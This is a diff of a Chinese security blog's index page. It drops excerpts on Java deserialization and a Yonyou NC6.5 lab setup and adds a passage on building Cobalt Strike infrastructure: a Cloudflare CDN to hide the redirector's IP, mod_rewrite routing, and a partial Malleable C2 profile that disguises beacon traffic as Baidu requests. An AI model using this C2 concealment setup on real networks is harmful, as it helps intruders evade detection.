@@ -552,77 +552,6 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
-    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/12/07/readObject%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="藏青">
-      <meta itemprop="description" content="知行合一">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="藏青's BLOG">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/12/07/readObject%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">readObject深入分析</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2020-12-07 13:56:03 / Modified: 14:05:11" itemprop="dateCreated datePublished" datetime="2020-12-07T13:56:03+08:00">2020-12-07</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index">
-                    <span itemprop="name">代码审计</span>
-                  </a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>​    讲到JAVA的反序列化，我们肯定离不开readObject函数，我们在分析JAVA反序列化漏洞中，常常跟踪到readObject就跟踪结束，我们有没有想过readObject是如何实现反序列化的？为什么我们找到了readObject后并不能直接造成命令执行，还需要去寻找其他的调用链来配合才可以命令执行？今天我将和大家一起学习readObject这个函数。</p>
-<h3 id="readObject简介"><a href="#readObject简介" class="headerlink" title="readObject简介"></a>readObject简介</h3><p>​        </p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
     <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -654,7 +583,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-12-03 15:36:44" itemprop="dateModified" datetime="2020-12-03T15:36:44+08:00">2020-12-03</time>
+                <time title="Modified: 2020-12-24 09:53:36" itemprop="dateModified" datetime="2020-12-24T09:53:36+08:00">2020-12-24</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -1086,124 +1015,6 @@
 <p>​    这个工具在检测key是否正确的过程中调用了ysoserial的ShiroCheck，可我去查看ysoserial的github项目，发现并没有这个选项，也就是这个是作者自己扩展编写的。我们反编译ShiroExploit自带的ysoserial，他的实现也非常简单，就是创建一个SimplePrincipalCollection对象。</p>
 <p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201202105609290.png" alt="image-20201202105609290"></p>
 <h4 id="如何检测利用链？"><a href="#如何检测利用链？" class="headerlink" title="如何检测利用链？"></a>如何检测利用链？</h4><p>​        在JAVA的反序列化漏洞中，仅仅找到readObject反序列化并不一定能造成RCE，还有一点比较重要的是需要找到利用链，这个要具体展开讲需要依赖的知识点有点多，我之后会单独写一篇文章来讲解。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
-    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/11/15/%E7%94%A8%E5%8F%8BNC6-5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="藏青">
-      <meta itemprop="description" content="知行合一">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="藏青's BLOG">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/11/15/%E7%94%A8%E5%8F%8BNC6-5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">用友NC6.5漏洞复现及分析</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2020-11-15 13:53:27" itemprop="dateCreated datePublished" datetime="2020-11-15T13:53:27+08:00">2020-11-15</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-11-17 11:57:42" itemprop="dateModified" datetime="2020-11-17T11:57:42+08:00">2020-11-17</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" itemprop="url" rel="index">
-                    <span itemprop="name">漏洞分析</span>
-                  </a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>​    最近在项目里遇到了用友的NC，借着项目的机会对用友NC6.5的漏洞进行复现和分析。</p>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>​    再安装之前，首先要配置用友的数据库，可以选择oracle或者sqlserver，我这里选择sqlserver搭建数据库，首先创建一个数据库命名为NC65，再创建文件组，文件组如下，分别添加nnc_data01，nnc_data02，nnc_data03，nnc_index01，nnc_index02，nnc_index03</p>
-<p><img src="/2020/11/15/%E7%94%A8%E5%8F%8BNC6-5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/image-20201117111843846.png" alt="image-20201117111843846"></p>
-<p>​    再选择文件，大小设置为500M，增量选择1024K</p>
-<p><img src="/2020/11/15/%E7%94%A8%E5%8F%8BNC6-5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/image-20201117111854957.png" alt="image-20201117111854957"></p>
-<p>​    在数据库服务器中选择 管理工具 –数据源–创建数据源</p>
-<p><img src="/2020/11/15/%E7%94%A8%E5%8F%8BNC6-5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/image-20201117110200334.png" alt="image-20201117110200334"></p>
-<p>​    更改默认数据库</p>
-<p><img src="/2020/11/15/%E7%94%A8%E5%8F%8BNC6-5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/image-20201117110344395.png" alt="image-20201117110344395"></p>
-<p>​    在文件的压缩包下包含了一个自带的jdk文件，将这个文件夹放到C盘下并添加到环境变量中，如果已经安装了JDK可以跳过这个步骤。</p>
-<p><img src="/2020/11/15/%E7%94%A8%E5%8F%8BNC6-5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/image-20201115142147770.png" alt="image-20201115142147770"></p>
-<p>​    首先再网上下载到用友NC6.5的安装包，下载好以后，点击setup.bat进行安装</p>
-<p><img src="/2020/11/15/%E7%94%A8%E5%8F%8BNC6-5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/image-20201117110456049.png" alt="image-20201117110456049"></p>
-<p>​    然后要选择安装的产品，一般必须包含UAP Server、智能客户端应用平台这两个模块</p>
-<p><img src="/2020/11/15/%E7%94%A8%E5%8F%8BNC6-5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/image-20201117112016776.png" alt="image-20201117112016776"></p>
-<p>​    <img src="/2020/11/15/%E7%94%A8%E5%8F%8BNC6-5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/image-20201117110628012.png" alt="image-20201117110628012"></p>
-<p>安装完成的界面如下</p>
-<p><img src="/2020/11/15/%E7%94%A8%E5%8F%8BNC6-5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/image-20201115135748274.png" alt="image-20201115135748274"></p>
-<p>​    点击“下一步”，会来到下面的界面</p>
-<p><img src="/2020/11/15/%E7%94%A8%E5%8F%8BNC6-5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/image-20201115135955551.png" alt="image-20201115135955551"></p>
-<p>​    点击读取，再设置服务的ip地址</p>
-<p><img src="/2020/11/15/%E7%94%A8%E5%8F%8BNC6-5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/image-20201115140100655.png" alt="image-20201115140100655"></p>
-<p>​    下面我们选择数据源，我这里的SQLSERVER数据源不是本机，所以写的其他地址，刚进入这个选项的时候是编辑不了的，我们首先要选择“读取”，再选择“添加，填上数据库地址，端口，数据库名称，用户名密码，失效检查周期，缓存数等信息后选择保存。</p>
-<p><img src="/2020/11/15/%E7%94%A8%E5%8F%8BNC6-5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/image-20201115140841293.png" alt="image-20201115140841293"></p>
-<p>​    选择测试连接</p>
-<p><img src="/2020/11/15/%E7%94%A8%E5%8F%8BNC6-5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/image-20201117094057883.png" alt="image-20201117094057883"></p>
-<p>​    再配置文件服务器，服务器的ip地址就选择我们当前开启用友服务的ip地址。</p>
-<p><img src="/2020/11/15/%E7%94%A8%E5%8F%8BNC6-5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/image-20201117094219006.png" alt="image-20201117094219006"></p>
-<p>​    再选择配置安全数据源</p>
-<p><img src="/2020/11/15/%E7%94%A8%E5%8F%8BNC6-5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/image-20201117094308413.png" alt="image-20201117094308413"></p>
-<p>​    </p>
-<p>  选择部署服务器</p>
-<p><img src="/2020/11/15/%E7%94%A8%E5%8F%8BNC6-5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/image-20201115143853009.png" alt="image-20201115143853009"></p>
-<p>​    配置好以后选择退出，在c盘的home目录下找到startserver.bat文件运行，如下所示：</p>
-<p><img src="/2020/11/15/%E7%94%A8%E5%8F%8BNC6-5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/image-20201115144353245.png" alt="image-20201115144353245"></p>
-<p>​    这里有一个小坑，如果jdk路径中有空格则会失败</p>
-<p><img src="/2020/11/15/%E7%94%A8%E5%8F%8BNC6-5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/image-20201117114607825.png" alt="image-20201117114607825"></p>
-<p>​    启动后查看是否访问成功</p>
-<p><img src="/2020/11/15/%E7%94%A8%E5%8F%8BNC6-5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/image-20201115144511131.png" alt="image-20201115144511131"></p>
-<p>​    这里提供了两种方式访问用友，一种是通过下载客户端访问，一种是浏览器访问，浏览器访问需要下载和安装jdk7比较麻烦，我们可以下载uclient访问。下载好以后选择添加应用，输入我们服务端的ip地址，将NC6.5添加到应用列表中。</p>
-<p><img src="/2020/11/15/%E7%94%A8%E5%8F%8BNC6-5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/image-20201117095853871.png" alt="image-20201117095853871"></p>
-<p>​    这里我的数据库一直都没装上去。系统选项为空，导致没有办法正常登录。</p>
-<p><img src="/2020/11/15/%E7%94%A8%E5%8F%8BNC6-5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/image-20201117115609270.png" alt="image-20201117115609270"></p>
 
       
     </div>
@@ -1983,6 +1794,334 @@
   
   
 
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
+    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="藏青">
+      <meta itemprop="description" content="知行合一">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="藏青's BLOG">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/" class="post-title-link" itemprop="url">记基于cobaltstrike基础设施架构设计尝试</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-09-08 11:11:22" itemprop="dateCreated datePublished" datetime="2020-09-08T11:11:22+08:00">2020-09-08</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-10-12 10:59:14" itemprop="dateModified" datetime="2020-10-12T10:59:14+08:00">2020-10-12</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/cobaltstrike/" itemprop="url" rel="index">
+                    <span itemprop="name">cobaltstrike</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>​        通过之前的介绍我们了解了cobaltstrike的一些混淆或者隐藏的策略，这次我们主要对学到的这些策略进行实践，设计一个比较好用的不容易被反查的方案。</p>
+<p>​        设计思路如下：</p>
+<ul>
+<li><p>自定义mallable c2 profile文件，自定义通讯流量</p>
+</li>
+<li><p>前置机通过mod_rewrite对不同流量进行不同的转发</p>
+</li>
+<li><p>给前置机配置CDN保护前置机的真实IP</p>
+</li>
+<li><p>teamserver主机配置防火墙仅允许前置机和teamserver主机的特定端口通信</p>
+<p>因为CDN配置需要等待一段时间才能生效，所以我们先来配置CDN。</p>
+</li>
+</ul>
+<h3 id="cloudflare配置免费CDN"><a href="#cloudflare配置免费CDN" class="headerlink" title="cloudflare配置免费CDN"></a>cloudflare配置免费CDN</h3><p>​        在<a href="https://dash.cloudflare.com/login" target="_blank" rel="noopener">cloudflare</a>提供了免费的CDN,我们可以申请一个账号，登录后首先选择添加站点</p>
+<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908113445450.png" alt="image-20200908113445450"></p>
+<p>​            选择add a site添加我们想要配置CDN的域名后，选择free也就是免费的CND，确定后会来到如下界面，选择continue</p>
+<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908114452692.png" alt="image-20200908114452692"></p>
+<p>​        然后需要我们去我们自己的域名控制台去修改记录。</p>
+<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908114648182.png" alt="image-20200908114648182"></p>
+<p>​        我这里的域名是在腾讯云注册的，因此我来到腾讯云的控制台来修改</p>
+<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908114925213.png" alt="image-20200908114925213"></p>
+<p>​        找到注册商这里点击管理</p>
+<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908115122093.png" alt="image-20200908115122093"></p>
+<p>​        对DNS服务器进行修改，修改为cloudflare</p>
+<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908115215847.png" alt="image-20200908115215847"></p>
+<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908115641139.png" alt="image-20200908115641139"></p>
+<p>​        将NS记录也做一下修改</p>
+<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908120045948.png" alt="image-20200908120045948"></p>
+<p>​        设置好以后我们来到cloudflare，选择确认后会有一些配置，全选择默认就好了。</p>
+<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908120217855.png" alt="image-20200908120217855"></p>
+<p>​        配置好以后刚开是域名可能还是下面的状态</p>
+<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908120401476.png" alt="image-20200908120401476"></p>
+<p>​        点击域名后往下拉，有个re-check的按钮，可以通过这个来检测配置是否生效，这个需要一段时间才可以生效。</p>
+<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908120439002.png" alt="image-20200908120439002"></p>
+<p>​        稍微等待一会以后，再去查看域名，发现状态变成了active，这说明配置的解析已经生效了</p>
+<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908121034826.png" alt="image-20200908121034826"></p>
+<p>​        进入域名以后，我们可以看到这里已经提示配置成功了，我们再去选择DNS对解析记录进行修改</p>
+<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908121124053.png" alt="image-20200908121124053"></p>
+<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908121316626.png" alt="image-20200908121316626"></p>
+<p>​        配置好以后我们再去ping我们的域名可以看到得到的IP是cloudflare节点的IP</p>
+<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908121455393.png" alt="image-20200908121455393"></p>
+<h3 id="自定义Mallable-C2-流量"><a href="#自定义Mallable-C2-流量" class="headerlink" title="自定义Mallable C2 流量"></a>自定义Mallable C2 流量</h3><p>​        之前我们了解过关于Mallable C2 profile文件的编写，今天我们尝试着去编写一个profile文件，因为百度在国内用的也比较多，所以我将尝试以百度为例来进行流量混淆。</p>
+<p>​        首先是一些是一些基本的配置信息，这些配置和流量本身没有太大关系，所以可以先配置这部分的信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">###Global Options###</span><br><span class="line">set sample_name &quot;baidu.profile&quot;;</span><br><span class="line"></span><br><span class="line">set sleeptime &quot;5000&quot;;  &#x2F;&#x2F;延时5秒左右</span><br><span class="line">set jitter    &quot;30&quot;;   &#x2F;&#x2F;配置延时的波动百分比，我们这里也控制在百分之30</span><br><span class="line">set useragent &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;85.0.4183.83 Safari&#x2F;537.36&quot;;  &#x2F;&#x2F;user-agent配置</span><br><span class="line"></span><br><span class="line">###SMB options###    &#x2F;&#x2F;smb 命名管道名称的配置</span><br><span class="line">set pipename &quot;ntsvcs&quot;;</span><br><span class="line">set pipename_stager &quot;nbtsvcs&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>​        下来我们要配置一些和百度有关的流量部分的配置,因为我们设置profile文件的目的就是使我们的通信流量模拟百度的通信流量，因此我们首先要分析百度的流量，从中选择比较合适的流量。首先我们先来看下访问百度网站时的请求头的流量。</p>
+<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908144452608.png" alt="image-20200908144452608"></p>
+<p>​        我们根据百度的请求头来编写我们配置GET请求部分，下面这部分是客户端和teamserver服务端获取执行命令时的url的配置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">http-get &#123;</span><br><span class="line"></span><br><span class="line">    set uri &quot;&#x2F;cache&#x2F;global&#x2F;img&#x2F;aladdinIcon-1.0.gif&quot;;</span><br><span class="line">    </span><br><span class="line">    client &#123;</span><br><span class="line">        header &quot;Host&quot; &quot;www.baidu.com&quot;;</span><br><span class="line">        header &quot;Accept&quot; &quot;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9&quot;;	    </span><br><span class="line">        header &quot;Sec-Fetch-Site&quot; &quot;same-origin&quot;;</span><br><span class="line">        header &quot;Sec-Fetch-Mode&quot; &quot;no-cors&quot;;</span><br><span class="line">        header &quot;Sec-Fetch-Dest&quot; &quot;image&quot;;</span><br><span class="line">        header &quot;Referer&quot; &quot;https:&#x2F;&#x2F;www.baidu.com&#x2F;&quot;;</span><br><span class="line">        header &quot;Accept-Encoding&quot; &quot;gzip, deflate&quot;;</span><br><span class="line">        header &quot;Accept-Language&quot; &quot;zh-CN,zh;q&#x3D;0.9&quot;;</span><br><span class="line">        header &quot;Cookie&quot; &quot;BIDUPSID&#x3D;29A3A0F2775C00D759FDA49E071A0B78; PSTM&#x3D;1591203863; BAIDUID&#x3D;7B3B91054F6B7A69CCE98B945C800795:FG&#x3D;1; BD_UPN&#x3D;12314753; BDSFRCVID&#x3D;yi0OJeC62GgmFcJr_-UrEMX0j6W8_fcTH6aoA6yEDjKjrwuywjufEG0P_M8g0KubVI2-ogKKy2OTH9DF_2uxOjjg8UtVJeC6EG0Ptf8g0M5; H_BDCLCKID_SF&#x3D;tRk8_KtKtCI3HnRY-P4_-tAt2qoXetJyaR38BCJvWJ5TMCojbPcP-UIXBgcPbfQuynRB_f0yXbQjShPC-tnNjRFkQM6iaJjfb65fBt5D3l02VM7Ee-t2ynLV34uHe4RMW238oq7mWITUsxA45J7cM4IseboJLfT-0bc4KKJxbnLWeIJEjj6jK4JKDNtDJ5vP; BDRCVFR[feWj1Vr5u3D]&#x3D;I67x6TjHwwYf0; delPer&#x3D;0; BD_CK_SAM&#x3D;1; COOKIE_SESSION&#x3D;18454_1_8_9_7_18_0_0_8_6_2_3_3514086_0_11_0_1599115184_1598838986_1599115173%7C9%230_1_1598838982%7C1; BD_HOME&#x3D;1; PSINO&#x3D;7; BDORZ&#x3D;B490B5EBF6F3CD402E515D22BCDA1598; H_PS_645EC&#x3D;bc01FRkCkZHub5%2Fa5TNP%2Bnfm1rK01EMDjcigAfzJf0hSG5tXtJ5cc%2Fug9m4w3cQnMZxL; BDRCVFR[dG2JNJb_ajR]&#x3D;mk3SLVN4HKm; H_PS_PSSID&#x3D;7541_32606_1421_32620_32327_31660_32115_7565_32691_26350&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;Keep-Alive&quot;;</span><br><span class="line">	</span><br><span class="line">        metadata &#123;</span><br><span class="line">            netbios;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>​        配置好请求包后我们还要配置返回包,返回包原始内容如下</p>
+<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908144621899.png" alt="image-20200908144621899"></p>
